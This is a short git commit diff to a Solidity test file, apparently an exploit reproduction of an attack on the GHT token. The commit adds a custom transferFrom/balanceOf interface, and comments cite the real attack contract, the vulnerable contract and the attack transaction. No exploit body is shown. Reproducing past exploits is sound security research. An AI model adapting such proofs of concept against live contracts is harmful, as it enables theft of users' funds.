832529cf3a1622327c2e0bb5b5417211de02e65f
bixia <343224563@qq.com>
2024-03-07 22:49:16 +0800

    update

--- src/test/GHT_exp.sol
+++ src/test/GHT_exp.sol
@@ -9,10 +9,13 @@ import "./interface.sol";
 // Attack Contract : https://etherscan.io/address/0xcc5159b5538268f45afda7b5756fa8769ce3e21f
 // Vuln Contract : https://etherscan.io/address/0x528e046acfb52bd3f9c400e7a5c79a8a2c2863d0
 // Attack Tx : https://phalcon.blocksec.com/explorer/tx/eth/0xd17266bcdf30cbcbd7d0b5a006f43141981aeee2e1f860f68c9a1805ecacbc68?line=3
-
+interface IGHT {
+    function transferFrom(address, address, uint) external;
+    function balanceOf(address) external view returns (uint);
+}
 contract ContractTest is Test {
     WETH9 private constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
-    IERC20 private constant GHT = IERC20(0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0);
+    IGHT private constant GHT = IGHT(0x528e046ACfb52bD3f9c400e7A5c79A8a2c2863d0);
     Uni_Pair_V2 private constant WETH_GHT = Uni_Pair_V2(0x706206EabD6A70ca4992eEc1646B6D1599259CAe);
 
     function setUp() public {
